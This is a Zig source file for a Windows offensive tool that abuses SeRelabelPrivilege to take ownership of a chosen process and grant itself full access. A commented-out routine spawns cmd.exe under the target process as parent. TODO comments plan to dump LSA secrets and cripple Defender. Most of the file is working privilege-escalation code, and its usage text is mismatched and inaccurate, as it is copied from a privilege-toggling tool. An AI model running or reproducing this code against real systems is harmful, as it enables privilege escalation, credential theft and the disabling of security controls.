// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

// TODO: relabel a process token and drop it to a low privlege (defenderslam)
// TODO: relabel LSA to dump secrets

const utility = @import("lib/utility.zig");

const std = @import("std");
const win32 = @import("win32").everything;

const Action = struct {
    const Self = @This();

    const Error = error{
        StringToLong,
        AccountNotFound,
        NoMemory,
        UnableToOpenPolicy,
    };

    privilege: std.AutoHashMap(u32, u32),
    enable: bool,
    allocator: std.mem.Allocator,
    sid: *win32.SID,
    targetPID: u32,
    lpAccountName: [:0]u8,
    sourceProcessToken: ?win32.HANDLE,
    targetHandle: ?win32.HANDLE,

    targetDuplicateProcessToken: ?win32.HANDLE,
    targetProcessToken: ?win32.HANDLE,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .privilege = std.AutoHashMap(u32, u32).init(allocator),
            .enable = true,
            .allocator = allocator,
            .sid = undefined,
            .targetPID = undefined,
            .lpAccountName = undefined,
            .sourceProcessToken = null,
            .targetHandle = null,
            .targetDuplicateProcessToken = null,
            .targetProcessToken = null,
        };
    }

    fn takeProcessOwnership(pid: u32, puSid: []u64) !void {
        std.log.debug(("takeProcessOwnership: OpenProcess({d})"), .{pid});

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProc: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_WRITE_OWNER,
            0,
            pid,
        );
        if (hProc == null) {
            std.log.err("TakeProcessOwnership: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        var si: u32 = @bitCast(win32.OWNER_SECURITY_INFORMATION);
        si |= @bitCast(win32.LABEL_SECURITY_INFORMATION);

        const pSid: ?*win32.PSID = @ptrCast(@constCast(&puSid));
        // var sida: ?win32.PSTR = null;
        // // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
        // if (0 == win32.ConvertSidToStringSidA(
        //     pSid.?.*,
        //     &sida,
        // )) {
        //     std.log.err("\t TakeProcessOwnership.ConvertSidToStringSidA:CopySid failed. GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
        //     return Error.AccountNotFound;
        // }
        // std.log.debug("TakeProcessOwnership.SID: {s}\n", .{sida.?});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo
        const dwRes: u32 = win32.SetSecurityInfo(
            hProc,
            win32.SE_KERNEL_OBJECT,
            si,
            pSid.?.*,
            null,
            null,
            null,
        );

        if (dwRes != 0) {
            const err: win32.WIN32_ERROR = @enumFromInt(dwRes);
            std.log.err("TakeProcessOwnership: SetSecurityInfo dwRes: {any} GetLastError: {d}\n", .{ err, dwRes });
            return Error.AccountNotFound;
        }

        utility.closeHandle(hProc);
    }

    fn grantProcessFullControl(_: std.mem.Allocator, pid: u32, puSid: []u64) !void {
        var pOldDACL: ?*win32.ACL = null;
        var pNewDACL: ?*win32.ACL = null;
        var pSD: ?win32.PSECURITY_DESCRIPTOR = null;

        var da: u32 = @bitCast(win32.PROCESS_WRITE_DAC);
        da |= @bitCast(win32.PROCESS_READ_CONTROL);

        std.log.debug("About to openProcess ", .{});

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProcess = win32.OpenProcess(
            @bitCast(da), // [in] DWORD dwDesiredAccess,
            0, //                            [in] BOOL  bInheritHandle,
            pid, //                          [in] DWORD dwProcessId
        );
        defer _ = utility.closeHandle(hProcess);

        if (hProcess == null) {
            std.log.err("[!] Failed OpenProcess :: null handle", .{});
            return Error.AccountNotFound;
        }

        const result = @intFromEnum(win32.GetLastError());

        if (result != 0) {
            std.log.err("[!] Failed OpenProcess :: error code ({d})", .{result});
            return Error.AccountNotFound;
        }

        std.log.debug("About to GetSecurityInfo ", .{});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-getsecurityinfo
        const dwRes = win32.GetSecurityInfo(
            hProcess.?, // [in]            HANDLE               handle,
            win32.SE_KERNEL_OBJECT, // [in]            SE_OBJECT_TYPE       ObjectType,
            @bitCast(win32.DACL_SECURITY_INFORMATION), // [in]            SECURITY_INFORMATION SecurityInfo,
            null, // [out, optional] PSID                 *ppsidOwner,
            null, // [out, optional] PSID                 *ppsidGroup,
            &pOldDACL, // [out, optional] PACL                 *ppDacl,
            null, // [out, optional] PACL                 *ppSacl,
            &pSD, // [out, optional] PSECURITY_DESCRIPTOR *ppSecurityDescriptor
        );

        if (dwRes != win32.ERROR_SUCCESS) {
            std.log.err("[!] Failed GetSecurityInfo :: error code ({any})", .{dwRes});
            return Error.AccountNotFound;
        }

        std.log.debug("About to setup eastruct ", .{});

        const pSid: ?*win32.PSID = @ptrCast(@constCast(&puSid));
        // var sida: ?win32.PSTR = null;
        // // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
        // if (0 == win32.ConvertSidToStringSidA(pSid.?.*, &sida)) {
        //     std.log.err("\t GrantProcessFullControl.ConvertSidToStringSidA failed. GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
        //     return Error.AccountNotFound;
        // }
        // std.log.debug("GrantProcessFullControl.SID: {s}\n", .{sida.?});

        var ea: ?win32.EXPLICIT_ACCESS_W = std.mem.zeroes(win32.EXPLICIT_ACCESS_W);
        ea.?.grfAccessPermissions = @bitCast(win32.PROCESS_ALL_ACCESS);
        ea.?.grfAccessMode = win32.GRANT_ACCESS;
        ea.?.grfInheritance = win32.NO_INHERITANCE;
        ea.?.Trustee.TrusteeForm = win32.TRUSTEE_IS_SID;
        ea.?.Trustee.TrusteeType = win32.TRUSTEE_IS_USER;
        ea.?.Trustee.ptstrName = @alignCast(@ptrCast(pSid.?.*));

        std.log.debug("About to SetEntriesInAclW ", .{});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setentriesinaclw
        var ret = win32.SetEntriesInAclW(
            1,
            @ptrCast(&ea),
            pOldDACL,
            &pNewDACL,
        );

        if (ret != @intFromEnum(win32.ERROR_SUCCESS)) {
            std.log.err("[!] Failed SetEntriesInAclW :: error code ({any})", .{ret});
            return Error.AccountNotFound;
        }

        std.log.debug("About to SetSecurityInfo ", .{});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo
        ret = win32.SetSecurityInfo(
            hProcess,
            win32.SE_KERNEL_OBJECT,
            @bitCast(win32.DACL_SECURITY_INFORMATION),
            null,
            null,
            pNewDACL,
            null,
        );

        if (ret != @intFromEnum(win32.ERROR_SUCCESS)) {
            std.log.err("[!] Failed SetSecurityInfo :: error code ({any})", .{ret});
            return Error.AccountNotFound;
        }
    }

    pub fn attemptRelabel(self: *Self) !void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
        defer _ = utility.closeHandle(hProcess);

        if (hProcess == null) {
            std.log.debug("GetCurrentProcess failed", .{});
            return Action.Error.AccountNotFound;
        }

        if (!utility.tryEnablePrivilege(
            hProcess,
            win32.SE_RELABEL_NAME,
            &self.sourceProcessToken,
        )) {
            return error.UnableToOpenPolicy;
        }

        var ppSid = try utility.getProcessOwnerSID(self.allocator, self.sourceProcessToken);

        if (ppSid.* == null) {
            std.log.debug("getProcessOwnerSID failed", .{});
            return Action.Error.AccountNotFound;
        }

        takeProcessOwnership(self.targetPID, ppSid.*.?) catch |err| {
            std.log.err("Failed takeProcessOwnership {any}\n", .{err});
            return Action.Error.NoMemory;
        };

        std.log.debug("TakeProcessOwnership: Successfully took ownership of the process {d} handle.\n", .{self.targetPID});

        ppSid = try utility.getProcessOwnerSID(self.allocator, self.sourceProcessToken);

        if (ppSid.* == null) {
            std.log.debug("getProcessOwnerSID failed", .{});
            return Action.Error.AccountNotFound;
        }

        grantProcessFullControl(self.allocator, self.targetPID, ppSid.*.?) catch |err| {
            std.log.err("Failed grantProcessFullControl {any}\n", .{err});
            return Action.Error.NoMemory;
        };

        std.log.debug("GrantProcessFullControl: Successfully took ownership of the process {d} handle.\n", .{self.targetPID});
    }

    pub fn spawnProcessFromPID(self: *Self) !void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProc: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_CREATE_PROCESS, //    [in] DWORD dwDesiredAccess,
            0, //                               [in] BOOL  bInheritHandle,
            self.targetPID, //                  [in] DWORD dwProcessId
        );
        defer utility.closeHandle(hProc);

        if (hProc == null) {
            std.log.err("spawnProcessFromPID: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        std.log.err("spawnProcessFromPID: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});

        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);
        var startupInfo: win32.STARTUPINFOEXW = std.mem.zeroes(win32.STARTUPINFOEXW);
        var attributeSize: usize = 0;

        // get the required size ... ignore the error return - it's expected to "fail"
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
        _ = win32.InitializeProcThreadAttributeList(
            null,
            1,
            0,
            &attributeSize,
        );

        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
        const hHeap = win32.GetProcessHeap();
        if (hHeap == null) {
            std.log.err("spawnProcessFromPID: GetProcessHeap GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }
        startupInfo.StartupInfo.cb = @sizeOf(win32.STARTUPINFOEXW);

        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
        startupInfo.lpAttributeList = win32.HeapAlloc(
            hHeap,
            win32.HEAP_NONE,
            attributeSize,
        );
        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
        defer _ = win32.HeapFree(hHeap, win32.HEAP_NONE, startupInfo.lpAttributeList);

        if (startupInfo.lpAttributeList == null) {
            std.log.err("Unable to allocate si.lpAttributeList", .{});
            return Error.AccountNotFound;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
        if (0 == win32.InitializeProcThreadAttributeList(
            startupInfo.lpAttributeList,
            1,
            0,
            &attributeSize,
        )) {
            std.log.err("spawnProcessFromPID: InitializeProcThreadAttributeList GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
        if (0 == win32.UpdateProcThreadAttribute(
            startupInfo.lpAttributeList,
            0,
            win32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            @ptrCast(@constCast(&hProc)),
            @sizeOf(win32.HANDLE),
            null,
            null,
        )) {
            std.log.err("spawnProcessFromPID: UpdateProcThreadAttribute GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        const cmd = "C:\\windows\\system32\\cmd.exe";
        const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, cmd) catch undefined;
        errdefer self.allocator.free(lpApplicationName);

        const dwCreationFlags = win32.PROCESS_CREATION_FLAGS{
            .EXTENDED_STARTUPINFO_PRESENT = 1,
            .CREATE_NEW_CONSOLE = 1,
        };

        var lpProcessAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
        lpProcessAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);

        var lpThreadAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
        lpThreadAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);

        std.log.debug("[+] Attempting to create {s}\n", .{cmd});

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
        if (0 == win32.CreateProcessW(
            lpApplicationName,
            null,
            &lpProcessAttributes,
            &lpThreadAttributes,
            0,
            dwCreationFlags,
            null,
            null,
            @ptrCast(&startupInfo),
            &processInformation,
        )) {
            std.log.err("spawnProcessFromPID: CreateProcessA GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        std.log.debug("Process Created - PID: {d} - GLE: {d}", .{ processInformation.dwProcessId, @intFromEnum(win32.GetLastError()) });

        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
        if (win32.WaitForSingleObject(
            processInformation.hProcess,
            win32.INFINITE,
        ) == @intFromEnum(win32.WAIT_FAILED)) {
            std.log.err("spawnProcessFromPID: WaitForSingleObject GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-deleteprocthreadattributelist
        win32.DeleteProcThreadAttributeList(
            startupInfo.lpAttributeList,
        );

        defer utility.closeHandle(processInformation.hProcess);
        defer utility.closeHandle(processInformation.hThread);
    }

    pub fn debug(self: *Self) void {
        std.log.info("\nRelabel Targets PID: {d}\n", .{self.targetPID});
        std.log.info("\n", .{});
    }

    pub fn parseUsername(self: *Self, line: []u8) !void {
        self.lpAccountName = try std.fmt.allocPrintZ(self.allocator, "{s}", .{line});
        errdefer self.allocator.free(self.lpAccountName);
    }

    pub fn parsePID(self: *Self, line: []u8) !void {
        self.targetPID = std.fmt.parseInt(u32, line, 10) catch undefined;
    }

    pub fn deinit(self: *Self) void {
        defer self.allocator.free(self.lpAccountName);
    }
};

pub fn usage(argv: []u8) !void {
    const stdout = std.io.getStdOut().writer();

    try stdout.print(
        \\  This tool exist thanks to https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/
        \\
        \\Example:
        \\
        \\ Attempt to enable the privileges SeShutdown & SeTimeZone for the user 'pete':
        \\ .\\{s} pete 1969
        \\
        \\ Attempt to disable the privileges SeShutdown & SeTimeZone for the user 'pete':
        \\ .\\{s} pete 1969
        \\
        \\ Show this menu
        \\ .\\{s} -h
        \\
    , .{ argv, argv, argv });

    std.posix.exit(0);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 3) {
        try usage(args[0]);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parseUsername(arg);
        }

        if (i == 2) {
            try action.parsePID(arg);
        }

        i += 1;
    }

    action.debug();
    try action.attemptRelabel();

    // try action.spawnProcessFromPID();

    std.log.info("[+] Done", .{});

    std.posix.exit(0);
}
